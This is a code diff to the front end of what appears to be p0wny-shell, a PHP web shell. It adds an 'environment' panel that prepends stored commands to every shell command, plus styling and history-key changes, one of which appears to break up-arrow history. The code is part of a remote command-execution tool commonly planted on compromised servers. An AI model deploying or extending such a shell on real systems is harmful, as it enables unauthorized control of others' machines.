@@ -204,6 +204,22 @@ if (isset($_GET["feature"])) {
                 height: 100vh;
                 overflow: hidden;
             }
+            
+            *::-webkit-scrollbar-track {
+            	border-radius: 8px;
+            	background-color: #353535;
+            }
+            
+            *::-webkit-scrollbar {
+            	width: 8px;
+                height: 8px;
+            }
+            
+            *::-webkit-scrollbar-thumb {
+            	border-radius: 8px;
+            	-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
+            	background-color: #bcbcbc;
+            }
 
             *::-webkit-scrollbar-track {
                 border-radius: 8px;
@@ -302,7 +318,8 @@ if (isset($_GET["feature"])) {
                 padding: 10px 0;
             }
 
-            #shell-input > label {
+            #shell-input > label,
+            #shell-environment > label {
                 flex-grow: 0;
                 display: block;
                 padding: 0 5px;
@@ -310,7 +327,9 @@ if (isset($_GET["feature"])) {
                 line-height: 30px;
             }
 
-            #shell-input #shell-cmd {
+            #shell-input #shell-cmd,
+            #shell-environment select,
+            #shell-environment button {
                 height: 30px;
                 line-height: 30px;
                 border: none;
@@ -328,8 +347,39 @@ if (isset($_GET["feature"])) {
                 align-items: stretch;
             }
 
-            #shell-input input {
+            #shell-input input,
+            #shell-environment select,
+            #shell-environment button {
                 outline: none;
+            }
+            
+            #shell-environment {
+                display: flex;
+                box-shadow: 0 1px 0 rgba(0, 0, 0, .3);
+                border-bottom: rgba(255, 255, 255, .05) solid 1px;
+            }
+            
+            #shell-environment span {
+                display: inline;
+            }
+            
+            #shell-environment button {
+                width: initial;
+                min-width: 35px;
+                font-weight: bold;
+            }
+            
+            #shell-environment select option {
+                background: #222;
+            }
+            
+            #shell-environment label,
+            #shell-environment button {
+                border-right: 1px solid rgba(255, 255, 255, .05);
+            }
+            
+            #shell-environment button:hover {
+                background: rgba(255, 255, 255, .05);
             }
         </style>
 
@@ -340,6 +390,8 @@ if (isset($_GET["feature"])) {
             var historyPosition = 0;
             var eShellCmdInput = null;
             var eShellContent = null;
+            var CMD_ENV = [];
+            var promptAddEnv = "Type a comand...\nThis command will execute before your command.\nE.x: export HOME=\"/home/p0wny\"";
 
             function _insertCommand(command) {
                 eShellContent.innerHTML += "\n\n";
@@ -367,6 +419,9 @@ if (isset($_GET["feature"])) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
                 } else {
+                    if (!/^\s*(download|cd)\s+[^\s]+\s*$/.test(command)) {
+                        command = attachEnvironment(command);
+                    }
                     makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(atob(response.name), response.file)
@@ -499,7 +554,6 @@ if (isset($_GET["feature"])) {
                         break;
                     case "ArrowUp":
                         if (historyPosition > 0) {
-                            historyPosition--;
                             eShellCmdInput.blur();
                             eShellCmdInput.value = commandHistory[historyPosition];
                             _defer(function() {
@@ -515,9 +569,9 @@ if (isset($_GET["feature"])) {
                         if (historyPosition === commandHistory.length) {
                             eShellCmdInput.value = "";
                         } else {
+                            eShellCmdInput.value = commandHistory[historyPosition];
                             eShellCmdInput.blur();
                             eShellCmdInput.focus();
-                            eShellCmdInput.value = commandHistory[historyPosition];
                         }
                         break;
                     case 'Tab':
@@ -557,6 +611,94 @@ if (isset($_GET["feature"])) {
                 };
                 xhr.send(getQueryString());
             }
+            
+            function _onAddEnvironment() {
+                var cmd = prompt(promptAddEnv);
+                
+                if (cmd === null || cmd.trim() === '') {
+                    return;
+                }
+
+                cmd = cmd.trim();
+                if (CMD_ENV.indexOf(cmd) === -1) {
+                    CMD_ENV.push(cmd);
+                    
+                    var env_list = document.getElementById("env-list");
+                    if (env_list.options[env_list.selectedIndex].value === "") {
+                        env_list.innerHTML = '';
+                    }
+                    env_list.insertAdjacentHTML( 'beforeend', '<option value="' + cmd + '" selected>$ ' + cmd + '</option>');
+                    
+                    document.getElementById("env-applied").innerHTML = CMD_ENV.length;
+                    document.getElementById("env-shell-prompt").setAttribute("title", CMD_ENV.length + " applied");
+                }
+            }
+            
+            
+            function _onEditEnvironment() {
+                if (!CMD_ENV.length) {
+                    return;
+                }
+                
+                var env_list = document.getElementById("env-list");
+                var env_selected = env_list.options[env_list.selectedIndex];
+                var new_cmd = prompt(promptAddEnv, env_selected.value);
+                
+                if (new_cmd === null) {
+                    return;
+                }
+                
+                if (new_cmd.trim() === '') {
+                    envRemove();
+                    return;
+                }
+                
+                new_cmd = new_cmd.trim();
+                CMD_ENV[env_list.selectedIndex] = new_cmd;
+                env_selected.value = new_cmd;
+                env_selected.label = "$ " + new_cmd;
+            }
+            
+            
+            function _onRemoveEnvironment() {
+                var env_list = document.getElementById("env-list");
+                var index = env_list.selectedIndex;
+                
+                if (!CMD_ENV.length || !confirm("Are you sure want remove this command:\n$ " + env_list.options[index].value)) {
+                    return;
+                }
+                
+                env_list.remove(index);
+                CMD_ENV.splice(index, 1);
+                
+                if (CMD_ENV.length === 0) {
+                    env_list.innerHTML = '<option value="" selected>no environment</option>';
+                }
+                
+                document.getElementById("env-applied").innerHTML = CMD_ENV.length;
+                document.getElementById("env-shell-prompt").setAttribute("title", CMD_ENV.length + " applied");
+            }
+            
+            function attachEnvironment(cmd) {
+                if (CMD_ENV.length === 0) {
+                    return cmd;
+                }
+                return CMD_ENV.join(";") + ";" + cmd;
+            }
+            
+            document.addEventListener('click', function(e) {
+                e = e || window.event;
+                var selection = window.getSelection(),
+                    target = e.target || e.srcElement;
+                
+                if (target.tagName === "SELECT") {
+                    return;
+                }
+
+                if(!selection.toString()) {
+                    document.getElementById('shell-cmd').focus();
+                }
+            }, false);
 
             document.onclick = function(event) {
                 event = event || window.event;
@@ -577,12 +719,27 @@ if (isset($_GET["feature"])) {
                 eShellContent = document.getElementById("shell-content");
                 updateCwd();
                 eShellCmdInput.focus();
+                
+                document.getElementById("env-add").addEventListener("click", function(){ _onAddEnvironment(); });
+                document.getElementById("env-edit").addEventListener("click", function(){ _onEditEnvironment(); });
+                document.getElementById("env-remove").addEventListener("click", function(){ _onRemoveEnvironment(); });
             };
         </script>
     </head>
 
     <body>
         <div id="shell">
+            <div id="shell-environment">
+                <label id="env-shell-prompt" class="shell-prompt" title="0 applied">
+                    <span>ENVIRONMENT[<span id="env-applied" title="">0</span>]</span>
+                </label>
+                <button id="env-add" class="env-add">&#10009;</button>
+                <button id="env-edit" class="env-edit">&#9999;</button>
+                <button id="env-remove" class="env-remove">&#10006;</button>
+                <select id="env-list">
+                    <option value="" selected>no environment</option>
+                </select>
+            </div>
             <pre id="shell-content">
                 <div id="shell-logo">
         ___                         ____      _          _ _        _  _   <span></span>
